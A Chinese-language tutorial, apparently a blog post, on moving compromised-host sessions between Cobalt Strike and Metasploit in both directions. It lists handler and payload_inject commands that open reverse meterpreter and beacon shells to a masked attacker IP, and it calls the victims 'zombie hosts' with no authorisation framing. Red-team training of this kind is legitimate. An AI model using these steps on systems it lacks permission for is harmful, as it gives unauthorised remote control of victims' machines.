最近看了很多公众号上出了Cobalt Strike的教程，都是说的如何搭建与基本功能使用，但是进阶功能提到的就很少了，，今天在下来和大家一起说说“msf与cs的双向联动”，姿势骚的同时，思路那么一定也得骚，这个功能可以帮助你在内网渗透提供更多的思路与想法以及操作方法。  
**前言**关于CobalStrike \[ 以下全部简称"CS" \] 和 MetaSploit \[ 以下全部简称 "Msf" \] 想必此处就不用再多废话了，总之，两者各有所长，比如，前者更适合做稳控平台，后者则更擅长各类内网搜集和漏洞利用，而我们今天的目的主要就是把两者的会话互相转移，让各自相互依托，方便我们协同渗透，话不多说，吃瓜群众端板凳看操作。  

# **第一回合**

## cs复制会话到msf

经过各种手段，终于把肉鸡弄上线，如下所示![](../Images/d81284bcb0e562c848b7238d9faff632.png)  
此时我们可以与msf进行联动，步骤如下：**1、首先在CS中设置：**添加一个监听器，name任意取这里取cs2msf，payload选择外部监听器windows/foreign/reverse\_tcp。![](../Images/9faf380613f43caa2bc91da82e560f04.png)**2、和预期一样生成了想要的监听器listeners**![](../Images/301e3a39026c509ea27e68755abb0f4e.png)**3、再切换到msf中设置：**msf选择useexploit/multi/handler模块并配置如下，LHOST和LPORT要与cs的监听器对应，payload使用windows/meterpreter/reverse\_tcp测试过程中目标机为win2008x64，但如设置x64会出错，此处应根据监听器配置不选择x64位配置。命令如下：  

*   
*   

```
use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp
```

![](../Images/7f0486b1c101a5fecb5afea9890f0bd6.png)

*   
*   

```
set LHOST 39.xxx.xxx.xxxset LPORT 8181
```

![](../Images/4018a9ae54ab5663acdc6f1255320ede.png)**4、再次回到cs选择Spawn派生**![](../Images/6042ff71d3aa183aee1edd9e6c389528.png)指定刚才生成的listener中的cs2msf监听器：![](../Images/1a6e6839c3425360ac7989a6168ca942.png)最后，回手掏，Msf中运行exploit：![](../Images/6759769d0b56f59fbb12bb095741cace.png)![](../Images/097ddc34e8415f19f41ef2e6623095e1.png)sessions到手，溜走。  

# **第二回合**

## msf复制会话到cs

我们有时候会首先会得到meterpreter得话怎么办，别急，我们也可以直接将会话转到cs中，然后协同渗透。步骤如下：获取meterpreter之后![](../Images/dffeca4a42e9059ac38218f5f12973dc.png)查看sessionsessions -l![](../Images/005b6487ee486b36ef6a8bcf554949b9.png)**1、首先把msf上获取到的meterpreter挂在后台运行**执行命令：background，即可 **2、然后使用 exploit/windows/local/payload\_inject来注入一个新的payload到session中，具体命令如下：  
**

*   
*   
*   
*   
*   
*   

```
use exploit/windows/local/payload_injectset payload windows/meterpreter/reverse_httpset LHOST 39.xxx.xxx.xxxset LPORT  9999set session 1set DISABLEPAYLOADHANDLER true
```

![](../Images/53e2a7c0bdbecbc34964a8c9e49045f6.png)

**3、切换到cs中，建立监听**![](../Images/40da180b8febb550932fc5b24d76de3c.png)点击保存save  **4、同样的所有的设置完成之后，回首掏，回到msf中，执行 命令exploit：** 这肉鸡还不是就乖乖来了么，，，主机上线![](../Images/a9c96bbbfbb01619c3c27598fc68abf9.png)Beacon到手，溜走。
